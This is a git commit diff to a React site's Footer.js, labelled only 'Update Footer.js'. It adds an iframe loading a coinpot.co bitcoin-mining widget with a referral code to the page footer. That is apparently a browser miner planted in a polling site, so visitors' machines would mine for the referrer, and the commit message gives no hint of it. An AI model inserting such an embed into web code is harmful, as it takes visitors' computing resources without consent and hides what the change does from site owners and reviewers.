cc16188300d2c543d44aa7bb9b3644a882b29cb9
Kshitij Tiwari <jagadguru6969@gmail.com>
2017-10-06 18:14:08 +0530

    Update Footer.js

--- app/components/Footer.js
+++ app/components/Footer.js
@@ -43,6 +43,7 @@ class Footer extends React.Component {
               <h3 className='lead'><strong>Voting</strong> and <strong>adding persons</strong></h3>
               <p><strong>still is ANONYMOUS</strong></p>
       <p>Zealicon 2k17</p>
+      <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoin/?ref=E368E707D93D&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
            <p>Follow us on <a href="https://www.facebook.com/jsspolls/">Facebook</a></p>
               
             </div>
